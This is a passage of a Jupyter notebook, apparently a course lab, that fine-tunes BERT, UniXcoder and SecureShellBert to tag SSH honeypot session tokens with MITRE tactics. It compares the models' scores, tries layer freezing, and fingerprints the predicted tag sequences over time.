    "model_name = \"google-bert/bert-base-uncased\"\n",
    "config = AutoConfig.from_pretrained(\n",
    "    pretrained_model_name_or_path=model_name,\n",
    "    id2label=id2label,\n",
    "    label2id=label2id,\n",
    ")\n",
    "bert_naked = AutoModelForTokenClassification.from_config(config)\n",
    "# display(bert_naked)\n",
    "\n",
    "r, f1, _ = pipeline(model_name, bert_naked, lr=1e-5, n_train_epochs=train_epochs, title=\"Bert Naked\")\n",
    "results.update(r)\n",
    "dict_f1_scores.update(f1)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "5_0skFRKue5G"
   },
   "source": [
    "Now fine-tune Unixcoder. Since Unixcoder was pre-trained with a coding corpus, the\n",
    "hypothesis is that it has more prior knowledge even on SSH (and therefore, it can obtain\n",
    "better results).\n",
    "Q: Can you confirm this hypothesis? How do the metrics change compared to the previous\n",
    "models"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "_zy4FeUQvcq4"
   },
   "outputs": [],
   "source": [
    "torch.manual_seed(42)\n",
    "torch.cuda.manual_seed(42)\n",
    "\n",
    "model_name = \"microsoft/unixcoder-base\"\n",
    "\n",
    "unixcoder_pretrained = AutoModelForTokenClassification.from_pretrained(\n",
    "    pretrained_model_name_or_path=model_name,\n",
    "    id2label=id2label,\n",
    "    label2id=label2id,\n",
    ")\n",
    "# display(unixcoder_pretrained)\n",
    "\n",
    "r, f1, _ = pipeline(model_name, unixcoder_pretrained, lr=1e-5, n_train_epochs=train_epochs, title=\"UniXcoder Pretrained\")\n",
    "results.update(r)\n",
    "dict_f1_scores.update(f1)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "wsBlnkN7wmfK"
   },
   "source": [
    "Can you confirm this hypothesis? How do the metrics change compared to the previous\n",
    "models?\n",
    "\n",
    "\n",
    "Based on our experimental results, the hypothesis that UniXcoder would outperform BERT-base-uncased due to its pre-training on coding corpora and its greater exposure to SSH/Bash-like sequences is not confirmed. While UniXcoder shows slightly higher macro precision (56.45% vs 55.79%), BERT-base-uncased achieves higher values on the most relevant overall metrics: token accuracy (83.77% vs 81.93%), macro recall (72.02% vs 65.99%), and macro F1-score (60.45% vs 59.11%).\n",
    "\n",
    "This indicates that, in our specific scenario and dataset, BERT-base-uncased outperforms UniXcoder in terms of general token-level classification and especially in its ability to recall (identify) correct MITRE tactic labels. The difference in macro F1-score, while not huge, suggests that the benefits of BERT’s general language pretraining outweigh the domain adaptation of UniXcoder in this context, possibly due to the nature of our labeled data or the limited number of training samples.\n",
    "\n",
    "In summary:\n",
    "\n",
    "    Our results do not confirm the initial hypothesis. Although UniXcoder is specialized for code, BERT-base-uncased yields better overall performance on this SSH NER task in terms of both accuracy and macro F1-score. This suggests that general-purpose language models, when fine-tuned appropriately, can still perform very competitively on specialized cybersecurity NLP tasks."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "PNSfuzoowoqa"
   },
   "source": [
    "Huggingface allows you to upload a model after training.\n",
    "In particular, ‘SmartDataPolito/SecureShellBert’ is a CodeBERT-based model7 that\n",
    "I further domain-adapted using a ∼ 20k-sessions corpora on BASH8,9. As UnixCoder,\n",
    "CodeBERT is a transformer-based model pre-trained on code. However, its pre-training\n",
    "strategy and corpus are older than UnixCoder’s (2020 vs 2022). Also, CodeBERT was not\n",
    "pre-trained on the SSH language, while UnixCoder was. My SecureShellBer domain-\n",
    "adaptation (using the 20k samples) improved the results w.r.t. CodeBERT. Load it from\n",
    "Huggingface and fine-tune it again\n",
    "Q: How will it perform against a newer, code-specific, model such as Unixcoder? Has\n",
    "the performance changed? Which is your best model?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "wdX3UFg5w3R-"
   },
   "outputs": [],
   "source": [
    "torch.manual_seed(42)\n",
    "torch.cuda.manual_seed(42)\n",
    "\n",
    "model_name = \"SmartDataPolito/SecureShellBert\"\n",
    "\n",
    "secureshellbert = AutoModelForTokenClassification.from_pretrained(\n",
    "    pretrained_model_name_or_path=model_name,\n",
    "    id2label=id2label,\n",
    "    label2id=label2id,\n",
    ")\n",
    "# display(secureshellbert)\n",
    "\n",
    "r, f1, _ = pipeline(model_name, secureshellbert, lr=1e-5, n_train_epochs=train_epochs, title=\"SecureShellBert\")\n",
    "results.update(r)\n",
    "dict_f1_scores.update(f1)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "qbxGsDqAknQt"
   },
   "source": [
    "### Results"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "HE0igth_knQt"
   },
   "outputs": [],
   "source": [
    "df = pd.DataFrame(results).T\n",
    "\n",
    "def highlight_max(s, props='font-weight: bold'):\n",
    "    return [props if v == s.max() else '' for v in s]\n",
    "\n",
    "styled = df.style.format('{:.2%}').apply(highlight_max, axis=0)\n",
    "\n",
    "print(\"Final results:\")\n",
    "display(styled)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "arHwNfLnknQu"
   },
   "outputs": [],
   "source": [
    "results = dict_f1_scores\n",
    "tags = sorted(list(next(iter(results.values())).keys()))\n",
    "n_tags = len(tags)\n",
    "n_models = len(results)\n",
    "\n",
    "x = np.arange(n_tags)  # the label locations\n",
    "width = 0.15           # width of each bar\n",
    "\n",
    "colors = plt.cm.Set2(np.linspace(0, 1, n_models))\n",
    "\n",
    "fig, ax = plt.subplots(figsize=(15, 4))\n",
    "\n",
    "for i, (model_name, f1_scores) in enumerate(results.items()):\n",
    "    scores = [f1_scores[tag] for tag in tags]\n",
    "    ax.bar(x + i * width - (width * (n_models - 1) / 2), scores, width, label=model_name, color=colors[i])\n",
    "\n",
    "\n",
    "threshold_labels = {\n",
    "    0.4: \"Bad\",\n",
    "    0.6: \"Poor to Fair\",\n",
    "    0.8: \"Good\",\n",
    "    1.0: \"Excellent\"\n",
    "}\n",
    "for y, label in threshold_labels.items():\n",
    "    ax.axhline(y, color='red', linestyle='--', linewidth=0.8)\n",
    "    ax.text(\n",
    "        x=n_tags - 0.5,\n",
    "        y=y + 0.01,\n",
    "        s=label,\n",
    "        fontsize=8,\n",
    "        color='red',\n",
    "        ha='right',\n",
    "        va='bottom'\n",
    "    )\n",
    "\n",
    "ax.set_xlabel('MITRE Tactic Tag', fontsize=10)\n",
    "ax.set_ylabel('F1-score', fontsize=10)\n",
    "ax.set_title('Per-Class F1-score Comparison', fontsize=12, pad=10)\n",
    "ax.set_xticks(x)\n",
    "ax.set_xticklabels(tags, rotation=45, ha='right')\n",
    "\n",
    "ax.grid(True, linestyle='--', alpha=0.7)\n",
    "ax.spines['top'].set_visible(False)\n",
    "ax.spines['right'].set_visible(False)\n",
    "\n",
    "ax.legend(title='Models', fontsize=9)\n",
    "\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "o2PioI0a1Q83"
   },
   "source": [
    "We evaluated SecureShellBert, a CodeBERT-based model further domain-adapted on a large corpus of Bash/SSH logs, to see whether this additional adaptation would lead to improved performance on the SSH NER task, compared to both BERT-base-uncased, UniXcoder, and a baseline BERT model trained from scratch.\n",
    "\n",
    "Our results show that SecureShellBert achieves the highest performance across most metrics, with a token accuracy of 88.75% and a macro F1-score of 72.72%. This slightly outperforms UniXcoder Pretrained (87.33% accuracy, 72.18% F1) and is a substantial improvement over BERT-base-uncased (Bert Pretrained: 84.49% accuracy, 62.84% F1) as well as the BERT model trained from scratch (Bert Naked: 74.40% accuracy, 48.29% F1).\n",
    "\n",
    "Therefore, SecureShellBert not only benefits from code-specific pre-training but also shows that further domain adaptation to Bash/SSH logs can yield measurable improvements on the SSH NER task, outperforming both general-purpose language models and even models pre-trained on code.\n",
    "\n",
    "This suggests that for our SSH NER task, code-pretrained models further adapted to the specific domain (like SecureShellBert) are the most effective with the current amount of labeled data and this setup, though strong performance from UniXcoder indicates the value of large-scale code pre-training as well.\n",
    "\n",
    "In conclusion, SecureShellBert is our best-performing model, closely followed by UniXcoder."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "Vwe6QAp8u5R5"
   },
   "source": [
    "Finally, perform an alternative fine-tuning of your best model. In particular, try fine-\n",
    "tuning:\n",
    "– Only the last 2 encoding layers + classification head\n",
    "– Only the classification head\n",
    "Q: How many parameters did you fine-tune in the scenario where everything was frozen?\n",
    "How many do you fine-tune now? Is the training faster? Did you have to change the LR\n",
    "to improve convergence when freezing the layers? How much do you lose in performance?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "u_50QX-Eu2pV"
   },
   "outputs": [],
   "source": [
    "best_model_name = \"microsoft/unixcoder-base\"\n",
    "\n",
    "best_model = AutoModelForTokenClassification.from_pretrained(\n",
    "    pretrained_model_name_or_path=best_model_name,\n",
    "    id2label=id2label,\n",
    "    label2id=label2id,\n",
    ")\n",
    "\n",
    "display(best_model)\n",
    "\n",
    "# Freeze all layers\n",
    "for param in best_model.base_model.parameters():\n",
    "    param.requires_grad = False\n",
    "\n",
    "# Unfreeze the last 2 layers\n",
    "# The encoder part depends on the architecture. Let's assume it's BERT-like (most common).\n",
    "for param in best_model.base_model.encoder.layer[-2:].parameters():\n",
    "    param.requires_grad = True\n",
    "\n",
    "# The classification head (the token classifier) also needs to be trainable\n",
    "for param in best_model.classifier.parameters():\n",
    "    param.requires_grad = True\n",
    "\n",
    "for name, param in best_model.named_parameters():\n",
    "    if param.requires_grad:\n",
    "        print(name)\n",
    "\n",
    "r, _, _ = pipeline(best_model_name, best_model, lr=1e-5, n_train_epochs=train_epochs, title=\"Frozen UnixCoder but Last 2 Layers+Classifier (LR=1e-5)\")\n",
    "results.update(r)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "_S1tfTKm3s3s"
   },
   "outputs": [],
   "source": [
    "model_name = \"microsoft/unixcoder-base\"\n",
    "\n",
    "model_2layer_classifier = AutoModelForTokenClassification.from_pretrained(\n",
    "    pretrained_model_name_or_path=model_name,\n",
    "    id2label=id2label,\n",
    "    label2id=label2id,\n",
    ")\n",
    "display(model_2layer_classifier)\n",
    "\n",
    "# Freeze all layers\n",
    "for param in model_2layer_classifier.base_model.parameters():\n",
    "    param.requires_grad = False\n",
    "\n",
    "\n",
    "# The classification head (the token classifier) also needs to be trainable\n",
    "for param in model_2layer_classifier.classifier.parameters():\n",
    "    param.requires_grad = True\n",
    "\n",
    "for name, param in model_2layer_classifier.named_parameters():\n",
    "    if param.requires_grad:\n",
    "        print(name)\n",
    "\n",
    "r, _, _ = pipeline(model_name, model_2layer_classifier, lr=1e-5, n_train_epochs=train_epochs,title=\"Frozen UnixCoder but Classification Layer (LR=1e-5)\")\n",
    "results.update(r)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "GJkGttS7knQv"
   },
   "outputs": [],
   "source": [
    "model_name = \"microsoft/unixcoder-base\"\n",
    "\n",
    "model_classifier = AutoModelForTokenClassification.from_pretrained(\n",
    "    pretrained_model_name_or_path=model_name,\n",
    "    id2label=id2label,\n",
    "    label2id=label2id,\n",
    ")\n",
    "display(model_classifier)\n",
    "# Freeze all layers\n",
    "for param in model_classifier.base_model.parameters():\n",
    "    param.requires_grad = False\n",
    "\n",
    "\n",
    "# The classification head (the token classifier) also needs to be trainable\n",
    "for param in model_classifier.classifier.parameters():\n",
    "    param.requires_grad = True\n",
    "\n",
    "for name, param in model_classifier.named_parameters():\n",
    "    if param.requires_grad:\n",
    "        print(name)\n",
    "\n",
    "r, _, _ = pipeline(model_name, model_classifier, lr=1e-4, n_train_epochs=train_epochs, title=\"Frozen UnixCoder but Classification Layer (LR=1e-4)\")\n",
    "results.update(r)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "Scl681IC4UPI"
   },
   "source": [
    "How many parameters did you fine-tune in the scenario where everything was frozen?\n",
    "How many do you fine-tune now? Is the training faster? Did you have to change the LR\n",
    "to improve convergence when freezing the layers? How much do you lose in performance?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "BfJ4xqeJknQw"
   },
   "outputs": [],
   "source": [
    "count = 0\n",
    "\n",
    "for param in model_classifier.base_model.parameters():\n",
    "    param.requires_grad = False\n",
    "    count += param.numel()\n",
    "print(f\"Number of trainable parameters in the base model: {count:.2e}\")\n",
    "\n",
    "count_last_two = 0\n",
    "for param in model_classifier.base_model.encoder.layer[-2:].parameters():\n",
    "    param.requires_grad = True\n",
    "    count_last_two += param.numel()\n",
    "\n",
    "count_classifier = 0\n",
    "# The classification head (the token classifier) also needs to be trainable\n",
    "for param in model_classifier.classifier.parameters():\n",
    "    param.requires_grad = True\n",
    "    count_classifier += param.numel()\n",
    "\n",
    "print(f\"Number of trainable parameters in the last two layers + classifier: {count_last_two + count_classifier:.2e}\")\n",
    "print(f\"Number of trainable parameters in the classifier: {count_classifier:.2e}\")\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "EKvzZQDTknQw"
   },
   "source": [
    "the training is faster, we have changed LR to improve convergence when we freezed all the layer minus the classifier.\n",
    "\n",
    "freezing all layer but the last two and the classifier: the accuracy and f1-score decrease by around 7 and 20 percent respectively.\n",
    "freezing all layer but the classifier: the accuracy and f1-score decrease by around 20 and 30 percent respectively."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "id": "lEpys7j1knQw"
   },
   "source": [
    "## Task 4: Inference"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "sWoYcIKQknQw"
   },
   "outputs": [],
   "source": [
    "dataset_url = 'https://github.com/PierfrancescoElia/AICyberLabs/raw/refs/heads/main/Lab03/cyberlab.bigcsv'\n",
    "cyberlab_df = pd.read_csv(dataset_url)\n",
    "def truncate_long_words(session):\n",
    "    max_length=30\n",
    "    truncated = ' '.join([w[:max_length] for w in session.split(\" \")])\n",
    "    return truncated\n",
    "\n",
    "\n",
    "cyberlab_df['trunc_session'] = cyberlab_df['session'].apply(truncate_long_words)\n",
    "\n",
    "dataset = Dataset.from_pandas(cyberlab_df.reset_index(drop=True))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "vQ0-RzUhknQw"
   },
   "outputs": [],
   "source": [
    "def inference(model_name, model):\n",
    "\n",
    "    tokenizer = AutoTokenizer.from_pretrained(model_name, add_prefix_space=True)\n",
    "\n",
    "\n",
    "\n",
    "    def tokenize_and_align_labels(samples):\n",
    "        split_sentences = [sentence.split(\" \") for sentence in samples[\"trunc_session\"]]\n",
    "\n",
    "        tokenized_inputs = tokenizer(\n",
    "            split_sentences,\n",
    "            truncation=True,  # Truncate to max length if needed\n",
    "            is_split_into_words=True,  # Input is already split into words\n",
    "            max_length=1024,\n",
    "        )\n",
    "\n",
    "        all_word_ids = []\n",
    "        for i in range(len(split_sentences)):\n",
    "            all_word_ids.append(tokenized_inputs.word_ids(batch_index=i))\n",
    "        tokenized_inputs[\"word_ids\"] = all_word_ids\n",
    "        return tokenized_inputs\n",
    "\n",
    "    original_columns = dataset.column_names\n",
    "    tokenized_datasets = dataset.map(\n",
    "        tokenize_and_align_labels,\n",
    "        batched=True, # Can be performed in batches, in order to speed up times!\n",
    "        remove_columns=original_columns, # To remove the original columns\n",
    "    )\n",
    "\n",
    "    print(tokenized_datasets['word_ids'][:5])  # Check the word_ids to ensure they are correct\n",
    "\n",
    "\n",
    "    class DataCollatorWithWordIds:\n",
    "        def __init__(self, tokenizer):\n",
    "            self.tokenizer = tokenizer\n",
    "\n",
    "        def __call__(self, features):\n",
    "            # Extract word_ids\n",
    "            word_ids = [feature[\"word_ids\"] for feature in features]\n",
    "\n",
    "            # Remove word_ids temporarily for padding\n",
    "            features_without_word_ids = [{k: v for k, v in f.items() if k != \"word_ids\"} for f in features]\n",
    "\n",
    "            # Pad tensors (input_ids, attention_mask)\n",
    "            batch = self.tokenizer.pad(\n",
    "                features_without_word_ids,\n",
    "                return_tensors=\"pt\"\n",
    "            )\n",
    "\n",
    "            # Add word_ids back\n",
    "            batch[\"word_ids\"] = word_ids\n",
    "\n",
    "            return batch\n",
    "\n",
    "    data_collator = DataCollatorWithWordIds(tokenizer=tokenizer)\n",
    "\n",
    "\n",
    "    dataloader = DataLoader(\n",
    "        tokenized_datasets,\n",
    "        shuffle=False,\n",
    "        collate_fn=data_collator,\n",
    "        batch_size=1024,\n",
    "    )\n",
    "\n",
    "\n",
    "    device = torch.device(\"cuda\" if torch.cuda.is_available() else \"cpu\")\n",
    "    model = model.to(device)\n",
    "\n",
    "    model.eval()\n",
    "    preds = []\n",
    "\n",
    "    for count, batch in enumerate(tqdm(dataloader)):\n",
    "        # if count > 5:\n",
    "        #     break\n",
    "        batch = {key:(value.to(device) if key != 'word_ids' else value) for key, value in batch.items()}\n",
    "        with torch.no_grad():\n",
    "            outputs = model(input_ids=batch[\"input_ids\"],\n",
    "                            attention_mask=batch[\"attention_mask\"],\n",
    "                            )\n",
    "\n",
    "        predictions = outputs.logits.argmax(dim=-1)\n",
    "        batch_preds = predictions.cpu().numpy()\n",
    "        batch_words_ids = batch['word_ids']\n",
    "\n",
    "        for pred_seq, word_id_seq in zip(batch_preds, batch_words_ids):\n",
    "            word_preds = []\n",
    "            previous_word_idx = None\n",
    "            for pred, word_idx in zip(pred_seq, word_id_seq):\n",
    "                if word_idx is None:\n",
    "                    continue\n",
    "                if word_idx != previous_word_idx:\n",
    "                    word_preds.append(pred)\n",
    "                previous_word_idx = word_idx\n",
    "            preds.append(word_preds)\n",
    "\n",
    "    return preds"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "v_VTvGRnknQx"
   },
   "outputs": [],
   "source": [
    "model_name = \"microsoft/unixcoder-base\"\n",
    "\n",
    "unixcoder_pretrained = AutoModelForTokenClassification.from_pretrained(\n",
    "    pretrained_model_name_or_path=model_name,\n",
    "    id2label=id2label,\n",
    "    label2id=label2id,\n",
    ")\n",
    "# display(unixcoder_pretrained)\n",
    "\n",
    "_, _, best_model = pipeline(model_name, unixcoder_pretrained, lr=1e-5, n_train_epochs=50, title=\"UniXcoder Pretrained\")\n",
    "preds = inference(model_name, best_model)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "S6qBKjPWknQx"
   },
   "outputs": [],
   "source": [
    "for i in [1,5800]:\n",
    "    len_seq = len(cyberlab_df.iloc[i]['trunc_session'].split(\" \"))\n",
    "    len_preds = len(preds[i])\n",
    "\n",
    "\n",
    "    print(f\"Session {i+1} - Words: {len_seq}, Predictions: {len_preds}\")\n",
    "    print(\"Session:\")\n",
    "    print(cyberlab_df.iloc[i]['trunc_session'])\n",
    "    print(\"Predicted tags:\")\n",
    "\n",
    "    words = cyberlab_df.iloc[i]['trunc_session'].split(\" \")\n",
    "    tags = [id2label[p] for p in preds[i]]\n",
    "    for w, t in zip(words, tags):\n",
    "        print(f\"{w:25} {t}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "T_LSPssMknQx"
   },
   "outputs": [],
   "source": [
    "commands = ['cat', 'grep', 'echo', 'rm']\n",
    "tag_freq = {cmd: Counter() for cmd in commands}\n",
    "\n",
    "sample_sessions = {(cmd, tag): [] for cmd in commands for tag in unique_labels}\n",
    "\n",
    "for i in range(len(preds)):\n",
    "    words = cyberlab_df['trunc_session'][i].split(\" \")\n",
    "    preds_i = preds[i]\n",
    "    for pos, (word, pred) in enumerate(zip(words, preds_i)):\n",
    "        if word in commands:\n",
    "            tag_freq[word][id2label[pred]] += 1\n",
    "            sample_sessions[(word,id2label[pred])].append((i,pos))\n",
    "\n",
    "rows = []\n",
    "for cmd, freq in tag_freq.items():\n",
    "    total = sum(freq.values())\n",
    "    for tag in unique_labels:\n",
    "        count = freq.get(tag, 0)\n",
    "        frequency = count / total if total > 0 else 0\n",
    "        rows.append({'Command': cmd, 'Tag': tag, 'Frequency (%)': f\"{frequency * 100:.2f}\"})\n",
    "\n",
    "df_cmd_tag = pd.DataFrame(rows)\n",
    "df_pivot = df_cmd_tag.pivot(index='Command', columns='Tag', values='Frequency (%)')\n",
    "display(df_pivot)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "JEkH8nalknQx"
   },
   "outputs": [],
   "source": [
    "for k,v in sample_sessions.items():\n",
    "   print(k,v)\n",
    "   break\n",
    "\n",
    "\n",
    "for k,v in sample_sessions.items():\n",
    "    if len(v) > 0:\n",
    "        print(f\"Command: {k[0]}, Predicted Tag: {k[1]}\")\n",
    "        print(\"Example Sessions:\")\n",
    "        for sentence_id, position_id in v[:1]:\n",
    "            session = cyberlab_df.iloc[sentence_id]['trunc_session'].split(\" \")\n",
    "            print(f\"- [...]{' '.join(session[position_id:position_id+30])}[...] (Session ID: {sentence_id}, Position: {position_id})\")\n",
    "        print()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "CpylvCblknQx"
   },
   "outputs": [],
   "source": [
    "print(\"Total number of predictions:\")\n",
    "print(len(preds)) # Total number of predictions\n",
    "unique_fingerprints = set(tuple(pred) for pred in preds)\n",
    "print(\"Unique fingerprints:\")\n",
    "print(len(unique_fingerprints)) # Total number of unique fingerprints\n",
    "\n",
    "cyberlab_df['fingerprint'] = [tuple(pred) for pred in preds]\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "si-NbHDAknQx"
   },
   "outputs": [],
   "source": [
    "fingerprint_df = (\n",
    "    cyberlab_df.sort_values(by='timestamps_statements')\n",
    "    .groupby('fingerprint', as_index=False)\n",
    "    .first()[['fingerprint','timestamps_statements']]\n",
    ").sort_values(by='timestamps_statements')\n",
    "\n",
    "fingerprint_df.reset_index(drop=True, inplace=True)\n",
    "fingerprint_df"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "us9Cm96DknQx"
   },
   "outputs": [],
   "source": [
    "fingerprint_to_id = {tuple(f): idx for idx, f in enumerate(fingerprint_df['fingerprint'])}\n",
    "\n",
    "pairs = [\n",
    "    (pd.to_datetime(row.timestamps_statements).date(), fingerprint_to_id[tuple(row.fingerprint)]) for row in cyberlab_df.itertuples(index=False)\n",
    "]\n",
    "dict_day_fingerprint = Counter(pairs)\n",
    "sorted_list = sorted(dict_day_fingerprint.items(), key=lambda x: (x[0][0], x[0][1])) ## (date, fingerprint_id): num_occurrences\n",
    "\n",
    "for i in sorted_list[:10]:\n",
    "    print(i)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "Xrgh5FasknQx"
   },
   "outputs": [],
   "source": [
    "dates = [item[0][0] for item in sorted_list]\n",
    "fingerprint_indices = [item[0][1] for item in sorted_list]\n",
    "counts = [item[1] for item in sorted_list]\n",
    "\n",
    "log_counts = np.log10(np.array(counts) + 1)\n",
    "sizes = (log_counts) ** 2 * 100\n",
    "red_blue_cmap = LinearSegmentedColormap.from_list('RedBlue', ['#0000FF', '#FF0000'])\n",
    "\n",
    "plt.figure(figsize=(8, 5))\n",
    "scatter = plt.scatter(\n",
    "    dates,\n",
    "    fingerprint_indices,\n",
    "    s=sizes,\n",
    "    c=np.array(counts),\n",
    "    cmap=red_blue_cmap,\n",
    "    norm=mcolors.LogNorm(vmin=max(1, min(counts)), vmax=max(counts)),\n",
    "    alpha=0.8,\n",
    "    edgecolors='w',\n",
    "    linewidth=0.5\n",
    ")\n",
    "\n",
    "\n",
    "plt.colorbar(scatter, label='Number of Sessions')\n",
    "plt.xlabel('Date')\n",
    "plt.ylabel('Fingerprint Index')\n",
    "plt.title('Sessions Assigned to Fingerprints Over Time (Log Color Scale)')\n",
    "plt.xticks(rotation=45)\n",
    "plt.tight_layout()\n",
    "plt.show()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "id": "lVvieTQDknQy"
   },
   "outputs": [],
   "source": [
    "dates = [item[0][0] for item in sorted_list]\n",
    "fingerprint_indices = [item[0][1] for item in sorted_list]\n",
    "counts = [item[1] for item in sorted_list]\n",
    "\n",
    "records = defaultdict(int)\n",
    "for date, fid, count in zip(dates, fingerprint_indices, counts):\n",
    "    records[(date, fid)] += count\n",
    "\n",
    "\n",
    "df = pd.DataFrame(\n",
    "    [(date, fid, sessions) for (date, fid), sessions in records.items()],\n",
    "    columns=[\"date\", \"fingerprint_id\", \"sessions\"]\n",
    ")\n",
    "\n",
    "plt.figure(figsize=(12, 7))\n",
    "scatter = plt.scatter(df['date'], df['fingerprint_id'],\n",
    "                      c=df['sessions'],\n",
    "                      s=np.clip(df['sessions'], 10, 1000),\n",
    "                      cmap='coolwarm',\n",
    "                      alpha=0.7,\n",
    "                      edgecolors='w',\n",
    "                      linewidth=0.5)\n",
    "\n",
    "plt.colorbar(scatter, label='Associated Sessions')\n",
    "plt.xlabel('Date')\n",
    "plt.ylabel('Fingerprint ID')\n",
    "plt.title('Sessions per Fingerprint Over Time')\n",
    "plt.xticks(rotation=45)\n",
    "plt.grid(True)\n",
    "plt.tight_layout()\n",
    "plt.show()"
   ]
  }
 ],
 "metadata": {
  "accelerator": "GPU",
  "colab": {
   "gpuType": "T4",
   "provenance": [],
   "toc_visible": true
  },
  "kernelspec": {
   "display_name": "Python 3",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.13.3"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 0
}
